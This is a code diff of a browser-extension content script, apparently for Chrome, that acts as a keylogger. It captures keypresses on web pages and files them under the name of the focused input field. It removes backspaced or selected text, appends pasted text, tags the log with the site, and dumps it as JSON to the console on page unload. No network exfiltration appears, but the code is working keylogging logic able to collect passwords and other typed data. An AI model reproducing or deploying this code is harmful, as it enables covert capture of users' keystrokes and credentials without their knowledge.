@@ -1,36 +1,38 @@
 var site = null;
-var keys = "";
+var logger = new Object();
+var activeElement = null;
 var selectedText = null;
 var copiedText = null;
 
 const BACKSPACE = 8;
 const ENTER = 13;
 
-window.onbeforeunload = function() {
-    console.log(keys);   
-    keys = "";
-}
-
 chrome.runtime.onMessage.addListener(
     function(request) {
-        site = request.site;
-        console.log("site:" + site);
+        logger.site = request.site;
 });
 
+window.onbeforeunload = function() {
+    var jsonString= JSON.stringify(logger);
+    console.log(jsonString);
+}
 
-// var inputs = document.getElementsByTagName("input");
+document.onload = function() {
+    activeElement = document.activeElement.name;
+    selectedText = null;
+}
 
-// for(var i = 0; i < inputs.length; i++) {
-//     inputs[i].addEventListener("click", function(){
-//         console.log("clicked name "+ this.name + ", text: " + this.getAttribute("data-initial-value"));
-//         // console.log(chrome.tabs.get(0).url);
-//      });
-// }
+window.onload = function() {
+    activeElement = document.activeElement.name;
+}
 
 document.onkeypress = function(event) {
     var keyCode = event.keyCode;
-    var key = String.fromCharCode(keyCode)
-    keys += key;
+    var key = String.fromCharCode(keyCode);
+    if(logger.hasOwnProperty(activeElement))
+        logger[activeElement] += key;
+    else
+        logger[activeElement] = key;
 }
 
 // Remove Backspaces from Log
@@ -38,15 +40,22 @@ document.onkeydown = function(event) {
     var key = event.keyCode || event.charCode;
 
     if (key == BACKSPACE) {
-        if (selectedText != null && keys.indexOf(selectedText) != -1) {
-            keys = keys.substring(0, keys.indexOf(selectedText)) + keys.substring(keys.indexOf(selectedText)+selectedText.length)
+        if (selectedText != null && logger.hasOwnProperty(activeElement) && logger[activeElement].indexOf(selectedText) != -1) {
+            logger[activeElement] =  logger[activeElement].substring(0,  logger[activeElement].indexOf(selectedText)) +  logger[activeElement].substring( logger[activeElement].indexOf(selectedText)+selectedText.length);
         } else {
-            if (keys.length > 0) {
-                keys = keys.slice(0, -1);
+            if (logger.hasOwnProperty(activeElement) && logger[activeElement].length > 0) {
+                logger[activeElement] =  logger[activeElement].slice(0, -1);
             }
         }
     }         
 };
+
+
+function updateActiveElement(event) {
+    if(activeElement != document.activeElement.name) {
+        activeElement = document.activeElement.name;
+    }
+}
 
 function detectSelectedText() {
     var text = "";
@@ -63,8 +72,13 @@ function detectSelectedText() {
     selectedText = text;
 }
 
-document.onmouseup = detectSelectedText;
-document.onkeyup = detectSelectedText;
+function keyOrMouseUp(event) {
+    updateActiveElement(event);
+    detectSelectedText();
+}
+
+document.onmouseup = keyOrMouseUp;
+document.onkeyup = keyOrMouseUp;
 
 // Log Copy + Paste Text
 document.addEventListener('copy', function(){
@@ -72,5 +86,5 @@ document.addEventListener('copy', function(){
 });
 
 document.addEventListener('paste', function(event){
-    keys += copiedText;
+    logger[activeElement] += copiedText;
 });
